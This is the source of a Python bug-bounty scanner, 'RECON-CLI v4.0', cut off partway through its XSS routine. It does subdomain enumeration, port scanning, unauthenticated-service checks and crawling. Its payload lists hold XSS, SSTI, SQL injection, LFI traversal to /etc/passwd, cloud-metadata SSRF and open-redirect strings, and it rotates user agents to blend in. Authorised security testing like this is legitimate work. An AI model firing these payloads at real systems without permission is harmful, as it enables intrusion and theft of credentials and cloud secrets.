#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║     RECON-CLI v4.0 — Bug Bounty Pipeline (HackerOne Ready)      ║
║     Zero False Positive · Async · High Performance Edition      ║
╚══════════════════════════════════════════════════════════════════╝

REQUIREMENTS:
  pip install httpx[http2] urllib3 colorama

EXTERNAL TOOLS (optional):
  subfinder  → go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
  httpx      → go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
  nuclei     → go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest
  gau        → go install -v github.com/lc/gau/v2/cmd/gau@latest
  nmap       → sudo apt install nmap

USAGE:
  python3 recon_cli_v4.py -d example.com --all
  python3 recon_cli_v4.py -d example.com --recon --vuln --report
  python3 recon_cli_v4.py -d example.com --recon --ports --delay 0.3
  python3 recon_cli_v4.py -d example.com --nuclei --nuclei-severity high,critical

PERFORMANCE NOTES:
  v4.0 improvements over v3.0:
  - Full async HTTP via httpx (no GIL blocking on I/O)
  - Shared connection pools with keep-alive & HTTP/2
  - Semaphore-based rate limiting instead of sleep loops
  - Parallel baseline + canary verification in single async batch
  - Early-exit param scanning (skip reflected=False params immediately)
  - Smart URL deduplication with canonical param keys
  - Async port scanner using asyncio streams (no thread pool per port)
  - Concurrent subdomain/live-host probing with backpressure
  - Result streaming — findings print as they arrive
"""

import argparse
import asyncio
import base64
import concurrent.futures
import html as html_module
import json
import os
import re
import socket
import statistics
import subprocess
import sys
import tempfile
import time
import urllib.parse
import uuid
from datetime import datetime
from html.parser import HTMLParser
from pathlib import Path
from typing import Optional

if sys.stdout.encoding.lower() != 'utf-8':
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except AttributeError:
        pass

import httpx
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ──────────────────────────────────────────────
#  COLORS
# ──────────────────────────────────────────────
class C:
    RED     = '\033[91m'
    GREEN   = '\033[92m'
    YELLOW  = '\033[93m'
    BLUE    = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN    = '\033[96m'
    WHITE   = '\033[97m'
    BOLD    = '\033[1m'
    DIM     = '\033[2m'
    RESET   = '\033[0m'

def tag(color, label): return f"{color}[{label}]{C.RESET}"
INFO  = tag(C.BLUE,   '*')
OK    = tag(C.GREEN,  '+')
WARN  = tag(C.YELLOW, '!')
ERR   = tag(C.RED,    'X')
VULN  = tag(C.RED,    'VULN')
PORT  = tag(C.YELLOW, 'PORT')
SKIP  = tag(C.DIM,    '-')

# ──────────────────────────────────────────────
#  BANNER
# ──────────────────────────────────────────────
def print_banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(f"""{C.MAGENTA}{C.BOLD}
  ██████╗ ███████╗ ██████╗ ██████╗ ███╗   ██╗      ██████╗██╗     ██╗
  ██╔══██╗██╔════╝██╔════╝██╔═══██╗████╗  ██║     ██╔════╝██║     ██║
  ██████╔╝█████╗  ██║     ██║   ██║██╔██╗ ██║     ██║     ██║     ██║
  ██╔══██╗██╔══╝  ██║     ██║   ██║██║╚██╗██║     ██║     ██║     ██║
  ██║  ██║███████╗╚██████╗╚██████╔╝██║ ╚████║     ╚██████╗███████╗██║
  ╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═══╝      ╚═════╝╚══════╝╚═╝
{C.CYAN}  ══════════════════════════════════════════════════════════════════
  {C.WHITE}  Bug Bounty Pipeline v4.0  |  Async · High Performance · Zero FP
{C.CYAN}  ══════════════════════════════════════════════════════════════════{C.RESET}
""")

# ──────────────────────────────────────────────
#  GLOBAL STATE
# ──────────────────────────────────────────────
STATE = {
    "domain": "", "subdomains": [], "live_hosts": [], "open_ports": {},
    "wayback_urls": [], "param_urls": [], "findings": [],
    "started_at": "", "finished_at": "",
}

SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}

# ──────────────────────────────────────────────
#  ASYNC HTTP CLIENT — Shared pool, keep-alive
# ──────────────────────────────────────────────
# Global client instances (initialized in main)
_sync_client: Optional[httpx.Client] = None
_async_client: Optional[httpx.AsyncClient] = None

import random

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
]

DEFAULT_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
}

def get_sync_client() -> httpx.Client:
    global _sync_client
    if _sync_client is None or _sync_client.is_closed:
        _sync_client = httpx.Client(
            verify=False, follow_redirects=True, timeout=12,
            headers=DEFAULT_HEADERS,
            limits=httpx.Limits(max_connections=200, max_keepalive_connections=50),
            http2=True,
        )
    return _sync_client

async def get_async_client() -> httpx.AsyncClient:
    global _async_client
    if _async_client is None or _async_client.is_closed:
        _async_client = httpx.AsyncClient(
            verify=False, follow_redirects=True, timeout=12,
            headers=DEFAULT_HEADERS,
            limits=httpx.Limits(max_connections=300, max_keepalive_connections=100),
            http2=True,
        )
    return _async_client

def add_finding(ftype, severity, url, detail="", evidence="", confidence="confirmed"):
    entry = {
        "type": ftype, "severity": severity, "url": url,
        "detail": detail, "evidence": evidence[:500],
        "confidence": confidence, "timestamp": datetime.now().isoformat(),
    }
    STATE["findings"].append(entry)
    conf_tag = {
        "confirmed": f"{C.GREEN}[confirmed]{C.RESET}",
        "probable":  f"{C.YELLOW}[probable]{C.RESET}",
        "potential": f"{C.DIM}[potential]{C.RESET}",
    }.get(confidence, "")
    color = {
        "critical": C.RED + C.BOLD, "high": C.RED,
        "medium": C.YELLOW, "low": C.CYAN, "info": C.BLUE,
    }.get(severity, C.WHITE)
    print(f"  {VULN} {color}[{severity.upper()}]{C.RESET} {conf_tag} {ftype}")
    print(f"       {C.DIM}↳ {url}{C.RESET}")
    if detail:
        print(f"       {C.DIM}↳ {detail[:120]}{C.RESET}")

# ──────────────────────────────────────────────
#  HELPERS
# ──────────────────────────────────────────────
def run_tool(cmd, input_data=None):
    try:
        result = subprocess.run(cmd, input=input_data, capture_output=True, text=True, timeout=300)
        return [l.strip() for l in result.stdout.splitlines() if l.strip()]
    except FileNotFoundError:
        return None
    except subprocess.TimeoutExpired:
        print(f"  {WARN} Timeout: {' '.join(cmd)}")
        return []

def tool_installed(name):
    try:
        subprocess.run([name, '--version'], capture_output=True, timeout=5)
        return True
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False

def get_title(html):
    m = re.search(r'<title[^>]*>(.*?)</title>', html, re.I | re.S)
    return m.group(1).strip()[:80] if m else "No Title"

def dedupe_urls(urls):
    """Canonical dedup: normalize param values to '=' for comparison."""
    seen, out = set(), []
    for u in urls:
        parsed = urllib.parse.urlparse(u)
        params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
        # Canonical key: sorted params with empty values
        key = (parsed.netloc, parsed.path,
               frozenset(params.keys()))
        if key not in seen:
            seen.add(key)
            out.append(u)
    return out

def safe_get(url, timeout=10, delay=0.0, headers=None, follow_redirects=True):
    if delay:
        time.sleep(delay)
    for attempt in range(3):
        try:
            client = get_sync_client()
            h = {**DEFAULT_HEADERS, **(headers or {})}
            if "User-Agent" not in h:
                h["User-Agent"] = random.choice(USER_AGENTS)
            r = client.get(url, headers=h, timeout=timeout, follow_redirects=follow_redirects)
            if r.status_code in (429, 502, 503, 504) and attempt < 2:
                time.sleep((attempt + 1) * 2)
                continue
            return r
        except Exception:
            if attempt < 2:
                time.sleep((attempt + 1) * 1.5)
            else:
                return None

def safe_post(url, data=None, json_data=None, timeout=10, delay=0.0, headers=None):
    if delay:
        time.sleep(delay)
    for attempt in range(3):
        try:
            client = get_sync_client()
            h = {**DEFAULT_HEADERS, **(headers or {})}
            if "User-Agent" not in h:
                h["User-Agent"] = random.choice(USER_AGENTS)
            r = client.post(url, data=data, json=json_data, headers=h, timeout=timeout)
            if r.status_code in (429, 502, 503, 504) and attempt < 2:
                time.sleep((attempt + 1) * 2)
                continue
            return r
        except Exception:
            if attempt < 2:
                time.sleep((attempt + 1) * 1.5)
            else:
                return None

async def async_get(url, client=None, timeout=10, headers=None, follow_redirects=True):
    for attempt in range(3):
        try:
            c = client or await get_async_client()
            h = {**DEFAULT_HEADERS, **(headers or {})}
            if "User-Agent" not in h:
                h["User-Agent"] = random.choice(USER_AGENTS)
            r = await c.get(url, headers=h, timeout=timeout, follow_redirects=follow_redirects)
            if r.status_code in (429, 502, 503, 504) and attempt < 2:
                await asyncio.sleep((attempt + 1) * 2)
                continue
            return r
        except Exception:
            if attempt < 2:
                await asyncio.sleep((attempt + 1) * 1.5)
            else:
                return None

# ──────────────────────────────────────────────
#  REFLECTION / CONTEXT ANALYSIS HELPERS
# ──────────────────────────────────────────────
def get_reflection_context(body: str, payload: str) -> str:
    idx = body.find(payload)
    if idx == -1:
        return ""
    return body[max(0, idx - 120): min(len(body), idx + len(payload) + 120)]

def is_reflection_in_executable_context(body: str, payload: str) -> tuple[bool, str]:
    if payload not in body:
        return False, "payload not found raw in body"

    encoded_html = html_module.escape(payload)
    raw_count    = body.count(payload)
    enc_count    = body.count(encoded_html)
    if raw_count <= enc_count:
        return False, "all occurrences are HTML-encoded"

    context = get_reflection_context(body, payload)
    if "<!--" in context:
        before_payload = context[:context.find(payload)]
        if before_payload.rfind("<!--") > before_payload.rfind("-->"):
            return False, "payload is inside HTML comment"

    before_payload = body[:body.find(payload)]
    near_before    = before_payload[-200:]
    in_dq = near_before.count('"') % 2 != 0
    in_sq = near_before.count("'") % 2 != 0
    last_open_tag  = near_before.rfind('<')
    last_close_tag = near_before.rfind('>')
    if last_open_tag > last_close_tag and (in_dq or in_sq):
        return False, "payload is inside a quoted attribute value"

    if '<' in payload and '>' in payload:
        if body.count('&lt;') >= body.count('<') or body.count('&gt;') >= body.count('>'):
            return False, "angle brackets appear to be encoded globally"

    return True, "payload reflected in executable context"

# ──────────────────────────────────────────────
#  FUZZING HELPERS — Async versions
# ──────────────────────────────────────────────
def build_fuzz_url(url: str, param: str, payload: str) -> str:
    parsed     = urllib.parse.urlparse(url)
    params     = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
    new_params = {k: v[:] for k, v in params.items()}
    new_params[param] = [payload]
    new_query  = urllib.parse.urlencode(new_params, doseq=True)
    return parsed._replace(query=new_query).geturl()

def fuzz_param(url, param, payload, delay=0.0):
    fuzzed_url = build_fuzz_url(url, param, payload)
    r = safe_get(fuzzed_url, delay=delay)
    return fuzzed_url, r

async def async_fuzz_param(client, url, param, payload):
    fuzzed_url = build_fuzz_url(url, param, payload)
    r = await async_get(fuzzed_url, client=client)
    return fuzzed_url, r

def get_params(url):
    parsed = urllib.parse.urlparse(url)
    return list(urllib.parse.parse_qs(parsed.query, keep_blank_values=True).keys())

async def async_get_baseline(client, url, retries=2):
    """Async parallel baseline fetching."""
    tasks = [async_get(url, client=client) for _ in range(retries)]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return [r for r in results if isinstance(r, httpx.Response)]

# ──────────────────────────────────────────────
#  1. SUBDOMAIN ENUMERATION
# ──────────────────────────────────────────────
async def run_subfinder_async(domain):
    print(f"\n{INFO} {C.BOLD}[RECON] Subdomain Enumeration{C.RESET}")
    subs = set()

    # subfinder subprocess — run in thread to not block event loop
    if tool_installed('subfinder'):
        print(f"  {INFO} Running subfinder…")
        loop = asyncio.get_event_loop()
        lines = await loop.run_in_executor(
            None, lambda: run_tool(['subfinder', '-d', domain, '-silent', '-all'])
        )
        if lines:
            subs.update(lines)
            print(f"  {OK} subfinder → {len(lines)} subdomains")
    else:
        print(f"  {SKIP} subfinder not installed")

    # Parallel: crt.sh + hackertarget concurrently
    async with httpx.AsyncClient(verify=False, timeout=20, headers=DEFAULT_HEADERS) as client:
        async def fetch_crtsh():
            try:
                r = await client.get(f"https://crt.sh/?q=%.{domain}&output=json")
                if r.is_success:
                    for entry in r.json():
                        for name in entry.get("name_value", "").split("\n"):
                            name = name.strip().lstrip("*.")
                            if name and domain in name:
                                subs.add(name)
                    print(f"  {OK} crt.sh → {len(subs)} total")
            except Exception as e:
                print(f"  {WARN} crt.sh: {e}")

        async def fetch_hackertarget():
            try:
                r = await client.get(f"https://api.hackertarget.com/hostsearch/?q={domain}")
                if r.is_success:
                    for line in r.text.splitlines():
                        if ',' in line:
                            subs.add(line.split(',')[0].strip())
            except Exception:
                pass

        await asyncio.gather(fetch_crtsh(), fetch_hackertarget())

    result = sorted(subs)
    STATE["subdomains"] = result
    print(f"  {OK} {C.GREEN}{C.BOLD}Total unique subdomains: {len(result)}{C.RESET}")
    return result

# ──────────────────────────────────────────────
#  2. LIVE HOST PROBING — Async, batch
# ──────────────────────────────────────────────
async def probe_single_async(client, subdomain, sem):
    async with sem:
        for scheme in ("https", "http"):
            url = f"{scheme}://{subdomain}"
            try:
                r = await client.get(url, timeout=8, follow_redirects=True)
                return {
                    "url":         url,
                    "subdomain":   subdomain,
                    "status":      r.status_code,
                    "title":       get_title(r.text),
                    "server":      r.headers.get("server", ""),
                    "content_len": len(r.content),
                    "redirect":    str(r.url) if str(r.url) != url else "",
                    "headers":     dict(r.headers),
                }
            except Exception:
                continue
    return None

async def probe_live_hosts_async(subdomains, concurrency=150):
    print(f"\n{INFO} {C.BOLD}[RECON] Live Host Probing ({len(subdomains)} targets){C.RESET}")
    live = []
    sem = asyncio.Semaphore(concurrency)

    async with httpx.AsyncClient(
        verify=False, follow_redirects=True, timeout=8,
        headers=DEFAULT_HEADERS,
        limits=httpx.Limits(max_connections=concurrency + 50, max_keepalive_connections=50),
    ) as client:
        tasks = [probe_single_async(client, s, sem) for s in subdomains]
        for coro in asyncio.as_completed(tasks):
            res = await coro
            if res:
                live.append(res)
                sys.stdout.write(f"\r  {OK} Live hosts: {C.GREEN}{len(live)}{C.RESET}   ")
                sys.stdout.flush()

    print()
    STATE["live_hosts"] = live
    print(f"  {OK} {C.GREEN}{C.BOLD}{len(live)} live hosts confirmed{C.RESET}")
    print(f"\n  {'URL':<50} {'Status':>6}  Title")
    print(f"  {'─'*50} {'──────':>6}  {'─'*30}")
    for h in sorted(live, key=lambda x: x["status"]):
        sc = h["status"]
        color = C.GREEN if sc == 200 else C.YELLOW if sc in (301, 302, 403) else C.RED
        print(f"  {h['url']:<50} {color}{sc:>6}{C.RESET}  {h['title'][:40]}")
    return live

# ──────────────────────────────────────────────
#  3. PORT SCANNING — Async streams, no thread pool
# ──────────────────────────────────────────────
TOP_PORTS = [
    21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143,
    389, 443, 445, 465, 587, 636, 993, 995, 1433, 1521,
    1723, 2049, 2375, 2376, 3000, 3306, 3389, 4243, 4848,
    5000, 5432, 5900, 6379, 7001, 8000, 8080, 8443, 8888,
    9200, 9300, 11211, 27017, 28017,
]
SERVICE_HINTS = {
    21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
    80: "HTTP", 110: "POP3", 143: "IMAP", 389: "LDAP", 443: "HTTPS",
    445: "SMB", 1433: "MSSQL", 1521: "Oracle", 2375: "Docker",
    2376: "Docker TLS", 3000: "Dev Server", 3306: "MySQL", 3389: "RDP",
    4848: "GlassFish", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis",
    7001: "WebLogic", 8080: "HTTP-Alt", 8443: "HTTPS-Alt",
    9200: "Elasticsearch", 9300: "Elasticsearch",
    11211: "Memcached", 27017: "MongoDB", 28017: "MongoDB HTTP",
}

async def async_scan_port(host, port, sem):
    """Pure async port scan using asyncio streams — no thread blocking."""
    async with sem:
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port), timeout=0.8
            )
            writer.close()
            try:
                await writer.wait_closed()
            except Exception:
                pass
            return port
        except Exception:
            return None

def _banner_grab(host, port, send=b"", timeout=3) -> str:
    try:
        ip = socket.gethostbyname(host)
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
            if send:
                s.sendall(send)
            return s.recv(512).decode(errors="replace")
    except Exception:
        return ""

# Service verifiers (sync, run in executor)
def _verify_docker_unauth(host, port):
    r1 = safe_get(f"http://{host}:{port}/v1.41/info", timeout=5)
    if not (r1 and r1.status_code == 200 and "DockerRootDir" in r1.text): return False, ""
    r2 = safe_get(f"http://{host}:{port}/v1.41/containers/json", timeout=5)
    if r2 and r2.status_code == 200:
        return True, "Docker daemon exposed — /info and /containers/json accessible without auth"
    return True, "Docker API /info accessible without authentication"

def _verify_redis_unauth(host, port):
    if "+PONG" not in _banner_grab(host, port, send=b"PING\r\n"): return False, ""
    banner2 = _banner_grab(host, port, send=b"INFO server\r\n")
    if "redis_version:" in banner2.lower():
        ver = re.search(r'redis_version:(\S+)', banner2, re.I)
        return True, f"Redis {ver.group(1) if ver else '?'} responds without authentication"
    return False, ""

def _verify_elastic_unauth(host, port):
    r1 = safe_get(f"http://{host}:{port}/", timeout=5)
    if not (r1 and r1.status_code == 200 and "cluster_name" in r1.text): return False, ""
    r2 = safe_get(f"http://{host}:{port}/_cat/indices", timeout=5)
    if r2 and r2.status_code == 200:
        return True, "Elasticsearch fully open — cluster + index listing without auth"
    try:
        cluster = r1.json().get("cluster_name", "unknown")
        return True, f"Elasticsearch cluster '{cluster}' accessible without authentication"
    except Exception:
        return True, "Elasticsearch cluster info accessible without authentication"

def _verify_memcached_unauth(host, port):
    banner = _banner_grab(host, port, send=b"stats\r\n")
    if "STAT " not in banner: return False, ""
    ver = re.search(r'STAT version (\S+)', banner)
    pid = re.search(r'STAT pid (\d+)', banner)
    return True, f"Memcached {ver.group(1) if ver else '?'} (PID {pid.group(1) if pid else '?'}) exposed"

_VERIFIERS = {
    2375: _verify_docker_unauth, 6379: _verify_redis_unauth,
    9200: _verify_elastic_unauth, 11211: _verify_memcached_unauth,
}

async def port_scanner_async(subdomains, concurrency=300):
    print(f"\n{INFO} {C.BOLD}[SCAN] Port Scanning ({len(TOP_PORTS)} ports × {len(subdomains)} hosts){C.RESET}")
    open_ports = {}
    sem = asyncio.Semaphore(concurrency)
    loop = asyncio.get_event_loop()

    # Resolve all hosts to IPs first (batch DNS)
    async def resolve(host):
        try:
            infos = await loop.getaddrinfo(host, None)
            return host, infos[0][4][0]
        except Exception:
            return host, None

    resolve_tasks = [resolve(s) for s in subdomains]
    host_ips = {h: ip for h, ip in await asyncio.gather(*resolve_tasks) if ip}

    # Scan all ports concurrently
    total = len(host_ips) * len(TOP_PORTS)
    done = 0

    async def scan_and_verify(host, ip, port):
        nonlocal done
        result = await async_scan_port(ip, port, sem)
        done += 1
        if result:
            open_ports.setdefault(host, []).append(port)
            svc = SERVICE_HINTS.get(port, "?")
            if port in _VERIFIERS:
                confirmed, detail = await loop.run_in_executor(
                    None, _VERIFIERS[port], host, port
                )
                if confirmed:
                    print(f"\r  {PORT} {C.RED+C.BOLD}{host}:{port}{C.RESET} ({svc}) — VERIFIED EXPOSED")
                    add_finding(f"Unauthenticated {svc} Exposed", "critical",
                                f"{host}:{port}", detail, confidence="confirmed")
                else:
                    print(f"\r  {PORT} {C.YELLOW}{host}:{port}{C.RESET} ({svc}) — open")
            else:
                print(f"\r  {PORT} {C.YELLOW}{host}:{port}{C.RESET} ({svc})")
        if done % 100 == 0:
            sys.stdout.write(f"\r  {INFO} Progress: {done}/{total}   ")
            sys.stdout.flush()

    tasks = [scan_and_verify(h, ip, p) for h, ip in host_ips.items() for p in TOP_PORTS]
    await asyncio.gather(*tasks)

    print()
    STATE["open_ports"] = open_ports
    total_open = sum(len(v) for v in open_ports.values())
    print(f"  {OK} {C.GREEN}{total_open} open ports across {len(open_ports)} hosts{C.RESET}")
    return open_ports

# ──────────────────────────────────────────────
#  4. URL COLLECTION — Async crawler
# ──────────────────────────────────────────────
async def collect_wayback_urls_async(domain):
    print(f"  {INFO} Querying Wayback Machine…")
    urls = []
    if tool_installed('gau'):
        loop = asyncio.get_event_loop()
        lines = await loop.run_in_executor(None, lambda: run_tool(['gau', '--subs', domain]))
        if lines:
            print(f"  {OK} gau → {len(lines)} URLs")
            STATE["wayback_urls"] = lines
            return lines
    try:
        async with httpx.AsyncClient(verify=False, timeout=30, headers=DEFAULT_HEADERS) as client:
            r = await client.get(
                "https://web.archive.org/cdx/search/cdx",
                params={
                    "url": f"*.{domain}/*", "output": "text",
                    "fl": "original", "collapse": "urlkey",
                    "limit": "10000", "filter": "statuscode:200",
                }
            )
            if r.is_success:
                urls = [l.strip() for l in r.text.splitlines() if l.strip()]
                print(f"  {OK} Wayback CDX → {len(urls)} URLs")
    except Exception as e:
        print(f"  {WARN} Wayback failed: {e}")
    STATE["wayback_urls"] = urls
    return urls

class LinkParser(HTMLParser):
    def __init__(self, base_url):
        super().__init__()
        self.base  = base_url
        self.links = set()

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag == 'a' and 'href' in attrs:
            self._add(attrs['href'])
        elif tag == 'form' and 'action' in attrs:
            self._add(attrs['action'])
        elif tag == 'input' and attrs.get('type', '').lower() not in ('password', 'submit', 'button'):
            name = attrs.get('name', '')
            if name:
                self.links.add(f"{self.base}?{name}=test")

    def _add(self, href):
        if not href or href.startswith(('mailto:', 'tel:', 'javascript:', '#')):
            return
        try:
            full   = urllib.parse.urljoin(self.base, href)
            parsed = urllib.parse.urlparse(full)
            base_p = urllib.parse.urlparse(self.base)
            if parsed.netloc == base_p.netloc or not parsed.netloc:
                self.links.add(full)
        except Exception:
            pass

JS_URL_RE = re.compile(
    r'''(?:fetch|axios\.(?:get|post)|url\s*:)\s*['"`]([^'"`\s]{4,})['"`]'''
    r'''|['"`](/(?:api|v\d+)/[^'"`\s?#]{2,})['"`]''',
    re.I
)

async def crawl_host_async(client, host_info, sem, max_depth=2, max_urls=200, delay=0.0):
    base_url = host_info["url"]
    to_visit = {base_url}
    visited  = set()
    param_urls = set()

    for _ in range(max_depth):
        if not to_visit:
            break
        batch    = list(to_visit - visited)[:max_urls]
        next_vis = set()

        async def fetch_page(url):
            if url in visited:
                return set(), set()
            visited.add(url)
            async with sem:
                if delay:
                    await asyncio.sleep(delay)
                try:
                    r = await client.get(url, timeout=8, follow_redirects=True)
                except Exception:
                    return set(), set()
            if r.status_code not in (200, 301, 302, 403):
                return set(), set()
            found_links = set()
            found_params = set()
            ct = r.headers.get('content-type', '')
            if 'html' in ct or 'javascript' in ct or not ct:
                try:
                    parser = LinkParser(url)
                    parser.feed(r.text)
                    found_links.update(parser.links - visited)
                except Exception:
                    pass
                for m in JS_URL_RE.finditer(r.text):
                    path = m.group(1) or m.group(2)
                    if path:
                        full = urllib.parse.urljoin(url, path)
                        found_links.add(full)
            if '?' in url and '=' in url:
                found_params.add(url)
            return found_links, found_params

        results = await asyncio.gather(*[fetch_page(u) for u in batch], return_exceptions=True)
        for res in results:
            if isinstance(res, tuple):
                links, params = res
                next_vis.update(links)
                param_urls.update(params)
        for u in next_vis:
            if '?' in u and '=' in u:
                param_urls.add(u)
        to_visit = next_vis

    return list(param_urls)

async def crawl_live_hosts_async(live_hosts, max_depth=2, max_urls_per_host=200, delay=0.0):
    print(f"  {INFO} Async crawling {len(live_hosts)} hosts (depth={max_depth})…")
    sem = asyncio.Semaphore(80)
    all_params = set()

    async with httpx.AsyncClient(
        verify=False, follow_redirects=True, timeout=10, headers=DEFAULT_HEADERS,
        limits=httpx.Limits(max_connections=150, max_keepalive_connections=50),
    ) as client:
        tasks = [
            crawl_host_async(client, h, sem, max_depth, max_urls_per_host, delay)
            for h in live_hosts
        ]
        for coro in asyncio.as_completed(tasks):
            results = await coro
            all_params.update(results)
            sys.stdout.write(f"\r  {INFO} Param URLs found: {C.GREEN}{len(all_params)}{C.RESET}   ")
            sys.stdout.flush()

    print()
    print(f"  {OK} Param URLs (raw): {len(all_params)}")
    return list(all_params)

def build_param_urls(all_urls):
    with_params = [u for u in all_urls if '?' in u and '=' in u]
    deduped = dedupe_urls(with_params)
    STATE["param_urls"] = deduped
    print(f"  {OK} Unique parameterised URLs: {C.BOLD}{len(deduped)}{C.RESET}")
    return deduped

# ──────────────────────────────────────────────
#  5. PAYLOADS
# ──────────────────────────────────────────────
XSS_PAYLOADS = [
    '"><script>alert(1)</script>',
    "'><svg/onload=alert(1)>",
    '"><img src=x onerror=alert(1)>',
    "<details/open/ontoggle=alert(1)>",
    '"><iframe src=javascript:alert(1)>',
    "';alert(1)//",
    '";alert(1)//',
]

SSTI_PAYLOADS = {
    "{{73*79}}": ["5767"], "${73*79}": ["5767"], "#{73*79}": ["5767"],
    "<%= 73*79 %>": ["5767"], "*{73*79}": ["5767"],
}

SQLI_ERROR_PAYLOADS = ["'", '"', "' OR ''='", "1'", "\\"]
SQLI_ERRORS = {
    "you have an error in your sql syntax": "MySQL",
    "warning: mysql_": "MySQL",
    "com.mysql.jdbc.exceptions": "MySQL",
    "[microsoft][odbc sql server driver]": "MSSQL",
    "unclosed quotation mark after the character string": "MSSQL",
    "pg_query()": "PostgreSQL", "pg_exec()": "PostgreSQL",
    "ora-01756": "Oracle", "ora-00907": "Oracle",
    "sqlite_": "SQLite", "jdbc error": "JDBC",
}
SQLI_TIME_PAYLOADS = [
    ("1 AND SLEEP(5)--", 5.0, "MySQL"),
    ("1' AND SLEEP(5)--", 5.0, "MySQL"),
    ("1; WAITFOR DELAY '0:0:5'--", 5.0, "MSSQL"),
    ("1 AND 1=(SELECT 1 FROM PG_SLEEP(5))--", 5.0, "PostgreSQL"),
]
LFI_PAYLOADS = [
    "../../../../etc/passwd", "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "php://filter/convert.base64-encode/resource=index.php",
    "..\\..\\..\\..\\windows\\win.ini",
]
LFI_SIGNATURES = {
    "linux_passwd": ["root:x:0:0:", "bin:x:1:", "/bin/bash", "nobody:x:"],
    "win_ini": ["[extensions]", "for 16-bit app support"],
}
SSRF_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/", ["ami-id", "instance-id", "local-ipv4"], 2),
    ("http://metadata.google.internal/computeMetadata/v1/", ["project-id", "instance", "email"], 2),
]
SSRF_PARAMS = {
    "url", "redirect", "next", "dest", "destination", "uri", "path", "proxy",
    "endpoint", "src", "source", "target", "fetch", "load", "open", "ref",
    "link", "image", "img", "callback", "file", "page", "host", "resource",
}
OPEN_REDIRECT_PAYLOADS = [
    "//evil-redir-test.com", "https://evil-redir-test.com",
    "//evil-redir-test.com/%2F..", "///evil-redir-test.com",
]
REDIRECT_PARAMS = {
    "redirect", "url", "next", "return", "returnto", "r", "u", "rurl",
    "goto", "link", "target", "to", "destination", "continue", "forward",
    "redirect_uri", "redirect_url", "redir",
}

# ──────────────────────────────────────────────
#  6. VULNERABILITY SCANNERS — Async, Zero FP
# ──────────────────────────────────────────────

async def scan_xss_async(param_urls, delay=0, concurrency=30):
    """
    Async XSS: parallel per-URL scanning with semaphore rate limiting.
    Strategy: canary → reflection check → payload → executable context → double-confirm.
    """
    print(f"  {INFO} XSS scanning ({len(param_urls)} URLs) — async strict mode…")
    found = 0
    sem   = asyncio.Semaphore(concurrency)

    async with httpx.AsyncClient(
        verify=False, follow_redirects=True, timeout=10, headers=DEFAULT_HEADERS,
        limits=httpx.Limits(max_connections=concurrency + 20, max_keepalive_connections=20),
    ) as client:

        async def scan_url(url):
            nonlocal found
            params = get_params(url)
            if not params:
                return

            # Fetch baseline once per URL
            async with sem:
                baseline = await async_get(url, client=client)
            if not baseline:
                return
            baseline_body = baseline.text

            for param in params:
                # Step 1: Canary check — is this param reflected at all?
                canary = f"XSSCK{uuid.uuid4().hex[:6].upper()}"
                async with sem:
                    if delay: await asyncio.sleep(delay)
                    fuzzed_c = build_fuzz_url(url, param, canary)
                    r_c = await async_get(fuzzed_c, client=client)
                if not r_c or canary not in r_c.text:
                    continue  # Not reflected — skip all payloads for this param

                confirmed = False
                for payload in XSS_PAYLOADS:
                    if confirmed:
                        break

                    canary2       = f"XSSCK{uuid.uuid4().hex[:6].upper()}"
                    canary_payload = canary2 + payload

                    async with sem:
                        if delay: await asyncio.sleep(delay)
                        fuzzed_url = build_fuzz_url(url, param, canary_payload)
                        r = await async_get(fuzzed_url, client=client)
                    if not r:
                        continue

                    body = r.text
                    if canary2 not in body or payload not in body:
                        continue
                    if payload in baseline_body:
                        continue

                    ok, reason = is_reflection_in_executable_context(body, payload)
                    if not ok:
                        continue

                    # Double-confirm
                    canary3 = f"XSSCK{uuid.uuid4().hex[:6].upper()}"
                    async with sem:
                        if delay: await asyncio.sleep(delay)
                        r2 = await async_get(build_fuzz_url(url, param, canary3 + payload), client=client)
                    if not r2 or canary3 not in r2.text or payload not in r2.text:
                        continue

                    ok2, reason2 = is_reflection_in_executable_context(r2.text, payload)
                    if not ok2:
                        continue

                    idx      = body.find(payload)
                    evidence = body[max(0, idx - 80): idx + len(payload) + 80]
                    add_finding(
                        "Reflected XSS", "high", fuzzed_url,
                        f"Param '{param}': unescaped in executable context. {reason2}",
                        evidence, confidence="confirmed",
                    )
                    found += 1
                    confirmed = True

